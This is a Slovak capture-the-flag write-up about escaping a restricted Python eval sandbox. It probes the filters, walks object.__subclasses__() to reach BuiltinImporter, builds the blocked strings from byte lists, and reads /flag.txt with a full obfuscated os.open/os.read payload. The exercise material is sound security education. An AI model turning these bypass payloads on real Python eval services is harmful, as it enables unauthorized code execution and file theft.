# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> snakes are wonderful creatures, and everyone loves them. Many people enjoy playing with snakes and find them fascinating companions. One on them lives on **`snakegame.leisure.tcc`** on port **`23001/TCP`**.
> 
> See you in the next incident!
> 
> **Hint1:**
> The snake is actually a python.


----------

# Riešenie #

Tu je jasné, že sa pripojíme na server pomocou príkazu ncat snakegame.leisure.tcc 23001. Po pripojení dostaneme hlášku s promptom na zadanie zrejme nejakého príkazu, resp python kódu.

    Hello, I can only speak Python, show me your code.
    Enter your code : 

Skúsil som pár príkazov, kde vidno, že je tam mnoho obmedzení, nepozná to print, zakázané je exec a pod.

    Enter your code : print("hello")                                                                                                                                                              I'm confused - name 'print' is not defined 
	
	Enter your code : exec("cat /etc/passwd")                                                                                                                                                     This is not allowed: exec  

	Hello, I can only speak Python, show me your code.
	Enter your code : "ahoj"

	Enter your code : "".join(["f","l","a","g"])                                                                                                                                                  This is not allowed: "" 

	Enter your code : 'ahoj'                                                                                                                                                                      This is not allowed: '   

	Enter your code : 1/0                                                                                                                                                                         I'm confused - division by zero 

	Enter your code : ().__subclasses__()                                                                                                                                                         I'm confused - 'tuple' object has no attribute '__subclasses__' 

	Enter your code : ().class.base.subclasses()                                                                                                                                                  I'm confused - invalid syntax (<string>, line 1) 

	Enter your code : (1).__class__.__base__                                                                                                                                                      <class 'object'>
	
Tu už to začína byť zaujímavé, ide teda nejakú formu python code injection. Po pár pokusoch sa mi poradilo vylistovať subclassy

	Enter your code : (1).__class__.__base__.__subclasses__()                                                                                                                                     [<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.RegexFlag'>, <class 're.Scanner'>, <class 'string.Template'>, <class 'string.Formatter'>]

všetky trie som si prepísal do tabuľky, aby som vedel indexy a začala zábava. Zaujila ma trieda `<class '_frozen_importlib.BuiltinImporter'>`

    Enter your code : ().__class__.__base__.__subclasses__()[107].__doc__ Meta path import for built-in modules.  All methods are either class or static methods to avoid the need to   instantiate the class. 

Vieme teda pracovať z classami a nejaké jednoduché veci s nimi robiť, skúsim importnuť "os" modul

    Enter your code : ().__class__.__base__.__subclasses__()[107].load_module("os").listdir() This is not allowed: os 

Takže ani os nemožeme použiť priamo, je tam na pozadí nejaky pomerne agresívny filter, úvodzovky možeme použiť, ale zrejme len v niektorých prípadov.. Zaujímava class je aj s indexom 5 `<class 'bytes_iterator'>` , po pár pokusoch sa mi podarilo obabrať systém a dokáže pracovať aj so stringami aké chcem

	Enter your code : ().__class__.__base__.__subclasses__()[5](i for i in [111,115]).decode()                                                                                                    os 

Skúsim loadnuť modul os teda obfuskovaným spôsobom a použijem os.listdir()

	Enter your code : ().__class__.__base__.__subclasses__()[107].load_module(().__class__.__base__.__subclasses__()[5](i for i in [111,115]).decode()).listdir()
	['start.sh', '.bashrc', 'venv', 'search-in-root-directory.hint', 'bin']

Heurééééka, viem už teda printnuť obsahy priečinkov, skúsime nazrieť do priečinka "/"

    Enter your code : ().__class__.__base__.__subclasses__()[107].load_module(().__class__.__base__.__subclasses__()[5](i for i in [111,115]).decode()).listdir(().__class__.__base__.__subclasses__()[5](i for i in [47]).decode())['root', 'sbin', 'proc', 'media', 'sys', 'home', 'tmp', 'srv', 'usr', 'mnt', 'etc', 'dev', 'boot', 'lib64', 'lib', 'run', 'bin', 'var', 'opt', 'flag.txt', '.dockerenv', 'entrypoint.sh']  

Tu už vidíme vlajku, resp súbor z vlajkou. Posledný krok ostáva, ako vlajku printnúť. Pozrieme dokumentáciu os modulu, poznáme os.listdir(), pohľadáme niečo užitočné, napríklad open
    
    Enter your code : ().__class__.__base__.__subclasses__()[107].load_module(().__class__.__base__.__subclasses__()[5](i for i in [111,115]).decode()).open(().__class__.__base__.__subclasses__()[5](i for i in [47,102,108,97,103,46,116,120,116]).decode()) This is not allowed: open 

Ďalší filter mi to prekazil, open  je zakázané, je treba nájsť iný prístup

    Enter your code : ().__class__.__base__.__subclasses__()[107].load_module(().__class__.__base__.__subclasses__()[5](i for i in [111,115]).decode()).read(().__class__.__base__.__subclasses__()[5](i for i in [47,102,108,97,103,46,116,120,116]).decode()) I'm confused - read expected 2 arguments, got 1  

Očividne možeme použiť read, akurát tam treba navkladať ďalšie argumenty.. Po dôkladnej analýze dokumentácie os modulu paythonu a priíkazu read, potrebujem zadať niečo takéto 

**`os.read(os.open("/flag.txt", os.O_RDONLY), 100)`**

Pri týchto obmedzeniach to bude niečo takéto 

**`BuiltinImporter.load_module("os").read(BuiltinImporter.load_module("os").open("/flag.txt", BuiltinImporter.load_module("os").O_RDONLY), 25)`**

	Enter your code : ().__class__.__base__.__subclasses__()[107]().load_module(().__class__.__base__.__subclasses__()[5](i for i in [111, 115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5](i for i in [114, 101, 97, 100]).decode()](().__class__.__base__.__subclasses__()[107]().load_module(().__class__.__base__.__subclasses__()[5](i for i in [111, 115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5](i for i in [111, 112, 101, 110]).decode()](().__class__.__base__.__subclasses__()[5](i for i in [47, 102, 108, 97, 103, 46, 116, 120, 116]).decode(), ().__class__.__base__.__subclasses__()[107]().load_module(().__class__.__base__.__subclasses__()[5](i for i in [111, 115]).decode()).O_RDONLY), 1000)
	b'FLAG{lY4D-GJaQ-VUks-PNQd}\n'

BINGO! Je to tam. Vlajka je na svete





----------

## Vlajka ##
    FLAG{lY4D-GJaQ-VUks-PNQd}